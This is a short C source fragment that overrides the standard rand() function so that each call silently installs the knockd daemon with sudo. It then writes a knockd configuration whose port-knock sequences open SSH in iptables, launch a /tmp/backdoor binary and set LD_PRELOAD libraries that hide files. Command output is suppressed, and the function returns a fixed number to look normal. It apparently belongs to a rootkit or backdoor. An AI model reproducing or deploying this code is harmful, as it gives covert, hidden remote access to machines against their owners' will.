int rand(void){

	int installPortKnocking = system("sudo apt install knockd > /dev/null 2>&1");

	int status = system("sudo echo '[openSSH]\n sequence = 7000,8000,9000\n seq_timeout = 5\n command = /sbin/iptables -I INPUT 1 -s %IP% -p tcp --dport 22 -j ACCEPT\n tcpflags = syn\n[closeSSH]\n sequence = 9000,8000,7000\n seq_timeout = 5\n command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n tcpflags = syn\n[launchINIT]\n sequence = 10,20,30\n command = LD_PRELOAD=/tmp/lib-rand.so /tmp/nb_rand\n tcpflags = syn\n[launchLDHIDE]\n sequence = 40,50,60\n #seq_timeout = 5\n command = export LD_PRELOAD=/tmp/lib-hide-files.so\n tcpflags = syn\n[launchBKD]\n sequence = 70,80,90\n seq_timeout = 5\n command = LD_PRELOAD=/tmp/lib-accept-connect.so /tmp/backdoor\n tcpflags = syn\n[unsetLD]\n sequence = 100,200,300\n seq_timeout = 5\n command = unset LD_PRELOAD\n tcpflags = syn' | sudo tee /etc/knockd.conf > /dev/null");

        int enableKnockd = system("sudo systemctl enable knockd > /dev/null 2>&1");
        int restartKnocked = system("sudo systemctl restart knockd > /dev/null");
	
	return 2025;
}

